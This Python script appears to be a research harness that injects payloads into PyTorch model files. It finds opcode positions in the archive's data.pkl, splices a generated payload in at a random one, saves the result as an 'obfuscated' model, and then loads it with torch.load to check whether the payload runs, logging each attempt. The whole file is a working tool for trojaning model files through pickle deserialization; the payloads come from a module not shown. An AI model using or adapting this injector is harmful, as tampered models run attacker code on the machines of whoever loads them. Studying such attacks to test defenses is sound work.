import torch
import gc
import csv
import multiprocessing
import datetime
import threading
import subprocess
import zipfile
import io
import sys
import pickle
import pickletools
import tempfile
import os
import random
import zlib
import struct

from payload_generator import (
    generate_paylaod,
    get_random_pkl_file,
)
from fickling.fickle import Pickled


def write_log_entry(log_entry, log_filename):
    """Write a single log entry to CSV file"""
    file_exists = os.path.exists(log_filename)

    with open(log_filename, "a", newline="", encoding="utf-8") as csvfile:
        fieldnames = [
            "timestamp",
            "model_path",
            "filename",
            "payload",
            "injection_position",
            "pickle_version",
            "file_size",
            "injection_status",
            "injection_error",
            "output_file",
            "load_status",
            "load_error",
            "load_timeout",
            "execution_time_seconds",
        ]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        if not file_exists:
            writer.writeheader()

        writer.writerow(log_entry)


def pytorch_injector(
    input_file_path,
    output_path,
    log_filename="injection_log_pytorch_text_classification.csv",
):
    # Initialize log entry
    start_time = datetime.datetime.now()
    filename = os.path.basename(input_file_path)

    log_entry = {
        "timestamp": start_time.isoformat(),
        "model_path": input_file_path,
        "filename": filename,
        "payload": "",
        "injection_position": 0,
        "pickle_version": 0,
        "file_size": 0,
        "injection_status": "FAILED",
        "injection_error": "",
        "output_file": output_path,
        "load_status": "NOT_ATTEMPTED",
        "load_error": "",
        "load_timeout": False,
        "execution_time_seconds": 0,
    }
    nc_output = {"stdout": None, "stderr": None, "proc": None}

    def pickled(path):
        with zipfile.ZipFile(path, "r") as zip_ref:
            data_pkl_path = next(
                (name for name in zip_ref.namelist() if name.endswith("/data.pkl")),
                None,
            )
            if data_pkl_path is None:
                raise ValueError("data.pkl not found in the zip archive")

            with zip_ref.open(data_pkl_path, "r") as pickle_file:
                model_data = pickle_file.read()
        return model_data

    try:
        payload = generate_paylaod(get_random_pkl_file("payloads/"))

        temp = tempfile.TemporaryFile("w+")
        locations = []
        model_data = pickled(input_file_path)
        file_size = len(model_data)
        log_entry["payload"] = payload

        inf = io.BytesIO(model_data)
        while inf.tell() != file_size:
            try:
                pickletools.dis(inf, temp)
                temp.seek(0)
                version = int(
                    temp.read()
                    .partition("highest protocol among opcodes = ")[2]
                    .partition("\n")[0]
                )
                temp.seek(0)
                tempLocations = [
                    location.partition(":")[0] for location in temp.read().split("\n")
                ]
                for location in tempLocations:
                    try:
                        locations.append((int(location), version))
                    except ValueError as e:
                        pass
            except Exception as e:
                print(e)
                break
        pos, version = random.choice(locations)

        log_entry["injection_position"] = pos
        log_entry["pickle_version"] = version
        inf.seek(0)
        print(payload)
        with zipfile.ZipFile(output_path, "w") as new_zip_ref:
            with zipfile.ZipFile(input_file_path, "r") as zip_ref:
                for item in zip_ref.infolist():
                    with zip_ref.open(item.filename) as entry:
                        if item.filename.endswith("/data.pkl"):
                            print(item.filename)
                            content_before = inf.read(pos)  # read up to position `pos`
                            content_after = inf.read()  # read the rest after pos
                            combined_content = content_before + payload + content_after
                            new_zip_ref.writestr(item.filename, combined_content)
                        else:
                            new_zip_ref.writestr(item.filename, entry.read())

        log_entry["injection_status"] = "SUCCESS"
        print("injection finished at", pos)
        print("loading model")
        log_entry["load_status"] = "ATTEMPTING"
        result = [None]
        exception = [None]

        gc.collect()

        def load_model():
            print("are we even here")
            try:
                result[0] = torch.load(
                    output_path, weights_only=False, map_location="cpu"
                )
                print("model loaded")
                del result[0]
                log_entry["load_status"] = "SUCCESS"
            except Exception as e:
                exception[0] = e
                log_entry["load_status"] = "ERROR"
                log_entry["load_error"] = str(e)[:500]

        # trying out multiprocessing instead of threading because that does not have the quiting thing
        process = multiprocessing.Process(target=load_model)
        process.start()
        process.join(timeout=25)
        if process.is_alive():
            print("Timeout reached. Killing process.")
            process.terminate()  # Force kill
            process.join()

        print("Finished with multiprocessing")

        # load_thread = threading.Thread(target=load_model)
        # load_thread.daemon = True
        #
        # load_thread.start()
        #
        # # Wait for both to complete
        # load_thread.join(timeout=25)

        # print("model output", result[0])
        # Print results

        if exception[0]:
            print(f"\n=== Load exception ===")
            print(exception[0])

        print("collecting garbage here")
        gc.collect()
    except Exception as e:
        log_entry["injection_status"] = "FAILED"
        log_entry["injection_error"] = str(e)[:500]
        print(f"Injection failed: {type(e).__name__}: {e}")
        gc.collect()
        import traceback

        traceback.print_exc()
        return None

    finally:
        # Calculate execution time and write log
        end_time = datetime.datetime.now()
        log_entry["execution_time_seconds"] = (end_time - start_time).total_seconds()
        write_log_entry(log_entry, log_filename)
        print(f"Log entry written to {log_filename}")

    return True


if __name__ == "__main__":
    pytorch_injector(
        "models/pytorch_model_aimer.bin",
        "payloads/pytorch_model_edited_injector_obfuscated.bin",
    )
